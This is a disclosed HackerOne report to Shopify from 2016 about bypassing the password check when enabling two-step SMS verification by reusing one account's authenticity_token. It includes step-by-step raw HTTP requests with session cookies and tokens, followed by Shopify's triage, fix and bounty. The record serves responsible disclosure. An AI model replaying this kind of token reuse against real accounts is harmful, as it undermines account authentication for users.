{"id":124845,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjQ4NDU=","url":"https://hackerone.com/reports/124845","title":"Bypassed password authentication before enabling OTP verification","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-03-21T19:41:56.853Z","submitted_at":"2016-03-21T19:41:56.853Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"jbbbkj","url":"/jbbbkj","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-15T13:52:15.328Z","bug_reporter_agreed_on_going_public_at":"2016-04-15T13:52:15.190Z","team_member_agreed_on_going_public_at":"2016-04-04T22:51:05.697Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"When we enable Two step verification then shopify first ask for password then allow user to set OTP verification. Here i bypassed this password verification.\nSteps to reproduce the vulnerability.\n1.To produce this vulnerability i created two account on shopify . For easy understand let give them name as Account-1 and Account-2 .\n2 Then in account-1 i click on \"enable two step verification\" and enter password and then choose msg as otp delivery option .\n3.After that request goes like this when i click send sms.(Note : This request is of Account-1 )\n\nPOST /admin/users/61826947/2fa/send_sms HTTP/1.1\nHost: pranav2111.myshopify.com\nConnection: keep-alive\nContent-Length: 164\nAccept: text/html, */*; q=0.01\nOrigin: https://pranav2111.myshopify.com\nX-CSRF-Token: JTHqOddyHCcNf4FDli1W8YPgfm8Ot+VaCmC7Cv9fRaSam1BO56YCGPybeLwPP0gf1UjAaxrktloxviLYK/3D7Q==\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://pranav2111.myshopify.com/admin/settings/account/61826947\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.8\nCookie: _secure_admin_session_id=dcdfb333c3f86c849e450b02b56ffd2b; user_auth_token=3cbcfe7e0190e4305ac74c29f31b8c96; ajs_anonymous_id=%229769d3c8-ad20-4609-874f-a78aa0cd3839%22; __ssid=5ec9ad9a-e032-4f95-a751-3aa871975c14; __utmt=1; _gat=1; _ab=1; storefront_digest=6734c1fe18d51ffeb3010a1e1ee2ac60ed1713a8d9ae4e2cdcfe2572b7bcbacd; _ga=GA1.2.1005531135.1458584824; ajs_user_id=null; ajs_group_id=null; _shopify_s=E42D7057-E27E-48C2-0985; _shopify_s=E42D7057-E27E-48C2-0985; _shopify_y=3A536E63-2299-41F8-666A; _shopify_y=3A536E63-2299-41F8-666A; __utma=1.1005531135.1458584824.1458584867.1458584867.1; __utmb=1.10.10.1458584867; __utmc=1; __utmz=1.1458584867.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; request_method=PUT\n\nutf8=%E2%9C%93\u0026authenticity_token=rsa0kKgaoxEIXhGgG50VRmQlN%2ByJ%2BGy8YhRyyyzs82wRbA7nmM69Lvm66F%2BCjwuoMo2J6J2rP7xZyusZ%2BE51JQ%3D%3D\u0026dial_code=91\u0026phone=9571477801\n\n4.Now i want to bypass password authentication in Account-2  so i replaced cookies , xsrf token , host and user_id in above request and keep authenticity_token same . Now request look loke this . \n\nPOST /admin/users/61715715/2fa/send_sms HTTP/1.1\nHost: pranav211.myshopify.com\nConnection: keep-alive\nAccept: text/html, */*; q=0.01\nOrigin: https://pranav2111.myshopify.com\nX-CSRF-Token: Kx73sRC9HbGJj9jLtQ9NgRUC8pQGa4tJpOezLAVH5tIgJum406kGTyWq01inBiQogJopoTONXZHmZsIDKjlmyA==\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://pranav211.myshopify.com/admin/settings/account/61715715\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.8\nCookie: _secure_admin_session_id=a8a57b3817251c4f15f6f41049c07efd; user_auth_token=9422e2060214202ffbac68226276f174; ajs_anonymous_id=%226775537b-23a4-49b5-b997-11ecce666834%22; __ssid=1c4fa8d1-7e09-46dd-bb80-1953c602cca9; _shopify_ga=_ga=1.56909218.985506741.1458494246; _ab=1; storefront_digest=9f55a543312d0d3b8c9558ee41c5c028b9bc204952ca6742ae8f627e17c69be4; __utma=1.985506741.1458494246.1458494304.1458584501.2; __utmb=1.23.10.1458584501; __utmc=1; __utmz=1.1458494304.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; _ga=GA1.2.985506741.1458494246; ajs_user_id=null; ajs_group_id=null; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_y=C854D035-5F8B-4E27-F41C; _shopify_y=C854D035-5F8B-4E27-F41C; request_method=POST\nContent-Length: 164\n\nutf8=%E2%9C%93\u0026authenticity_token=rsa0kKgaoxEIXhGgG50VRmQlN%2ByJ%2BGy8YhRyyyzs82wRbA7nmM69Lvm66F%2BCjwuoMo2J6J2rP7xZyusZ%2BE51JQ%3D%3D\u0026dial_code=91\u0026phone=9571477801\n\n\n5.When i submit this request then OTP is successfully delivered to my phone.\n6.Now i have to enter and verify OTP so i made following request and when i submit this request then request goes successful and mobile number is successfully attached to account-2 .\n\nPOST /admin/users/61715715/2fa/confirm HTTP/1.1\nHost: pranav211.myshopify.com\nConnection: keep-alive\nAccept: text/html, */*; q=0.01\nOrigin: https://pranav2111.myshopify.com\nX-CSRF-Token: Kx73sRC9HbGJj9jLtQ9NgRUC8pQGa4tJpOezLAVH5tIgJum406kGTyWq01inBiQogJopoTONXZHmZsIDKjlmyA==\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://pranav211.myshopify.com/admin/settings/account/61715715\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.8\nCookie: _secure_admin_session_id=a8a57b3817251c4f15f6f41049c07efd; user_auth_token=9422e2060214202ffbac68226276f174; ajs_anonymous_id=%226775537b-23a4-49b5-b997-11ecce666834%22; __ssid=1c4fa8d1-7e09-46dd-bb80-1953c602cca9; _shopify_ga=_ga=1.56909218.985506741.1458494246; _ab=1; storefront_digest=9f55a543312d0d3b8c9558ee41c5c028b9bc204952ca6742ae8f627e17c69be4; __utma=1.985506741.1458494246.1458494304.1458584501.2; __utmb=1.23.10.1458584501; __utmc=1; __utmz=1.1458494304.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; _ga=GA1.2.985506741.1458494246; ajs_user_id=null; ajs_group_id=null; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_y=C854D035-5F8B-4E27-F41C; _shopify_y=C854D035-5F8B-4E27-F41C; request_method=POST\nContent-Length: 160\n\nutf8=%E2%9C%93\u0026_method=put\u0026authenticity_token=H5kzy4XUsrrzV%2FCkripXF6IIF%2BeL%2BPGLoWvw1Hbo%2F3qgM4m8tQCshQKzCVs3OEn59KCp45%2BroouatWkGokp5Mw%3D%3D\u0026code=427060\n\n7.Means here authenticity_token is vulnerable , one account authenticity_token can be used in another account.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-05-04T22:51:05.946Z","allow_singular_disclosure_after":-171557006.5643718,"singular_disclosure_allowed":true,"vote_count":2,"voters":["mightyowl","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":861061,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\r\n\r\nOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!\r\n\r\nWhile you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!","automated_response":true,"created_at":"2016-03-21T19:41:57.805Z","updated_at":"2016-03-21T19:41:57.805Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":861082,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"Thank you for your report.\n\nPlease note that there are two CSRF protection mechanisms: the `authenticity_token` parameter and the `X-CSRF-Token` header. As long as one of these is valid, the request will be accepted. If you also remove or modify the `X-CSRF-Token` header, then your request should no longer be accepted.","automated_response":false,"created_at":"2016-03-21T19:52:35.052Z","updated_at":"2016-03-21T19:52:35.052Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":861094,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"yes i have also changed x-csrf token in the request but suppose attacker gain access to victim account when victim is logged-in then he can enable two step verification in victim account  without entering password.","automated_response":false,"created_at":"2016-03-21T20:05:02.936Z","updated_at":"2016-03-21T20:05:02.936Z","actor":{"username":"jbbbkj","cleared":false,"url":"/jbbbkj","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":861130,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tested this, and the `send_sms` request did not succeed unless the `setup` request was send first, and that request requires the user's password.","automated_response":false,"created_at":"2016-03-21T20:40:44.569Z","updated_at":"2016-03-21T20:40:44.569Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":862581,"is_internal":false,"editable":false,"type":"Activities::Comment","message":" it works without password , here i attached proof . If you still not consider this bug then what is the purpose of asking password before setting up two step verification ??? \nplease download attachment from following  link and rar file password is :  shopify123\nhttps://drive.google.com/file/d/0B25fvVteVEePMlRram9JOXQ4Y1E/view?usp=sharing ","automated_response":false,"created_at":"2016-03-22T17:30:08.061Z","updated_at":"2016-03-22T17:30:08.061Z","actor":{"username":"jbbbkj","cleared":false,"url":"/jbbbkj","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":862681,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Thank you for the video. We will try to reproduce this again and get back to you.","automated_response":false,"created_at":"2016-03-22T18:05:21.055Z","updated_at":"2016-03-22T18:05:21.055Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":862981,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I've now reproduced the issue. It turns out that this only works if the owner of Account-2 has previously selected \"Enable two-step authentication\" and chosen \"SMS Delivery\", but did not complete enrolment, which leaves their account in a state where enrolment can be resumed at a later time. I wasn't able to reproduce this earlier because I hadn't done those steps.","automated_response":false,"created_at":"2016-03-22T19:30:37.093Z","updated_at":"2016-03-22T19:30:37.093Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":865805,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This issue is now resolved. The `send_sms` action now has a mandatory `password` parameter like the earlier steps.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2016-03-23T20:50:09.280Z","updated_at":"2016-03-23T20:50:09.280Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jbbbkj","url":"/jbbbkj"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":868678,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for accepting this  bug and patching it very fast. I really appreciate your work .  :-)","automated_response":false,"created_at":"2016-03-24T03:10:45.566Z","updated_at":"2016-03-24T03:10:45.566Z","actor":{"username":"jbbbkj","cleared":false,"url":"/jbbbkj","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":888716,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify! This issue has been resolved.","automated_response":false,"created_at":"2016-04-04T22:50:57.286Z","updated_at":"2016-04-04T22:50:57.286Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"jbbbkj","url":"/jbbbkj"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":888717,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-04-04T22:51:05.731Z","updated_at":"2016-04-04T22:51:05.731Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":907857,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-04-15T13:52:15.249Z","updated_at":"2016-04-15T13:52:15.249Z","actor":{"username":"jbbbkj","cleared":false,"url":"/jbbbkj","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":907858,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-04-15T13:52:15.367Z","updated_at":"2016-04-15T13:52:15.367Z","actor":{"username":"jbbbkj","cleared":false,"url":"/jbbbkj","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}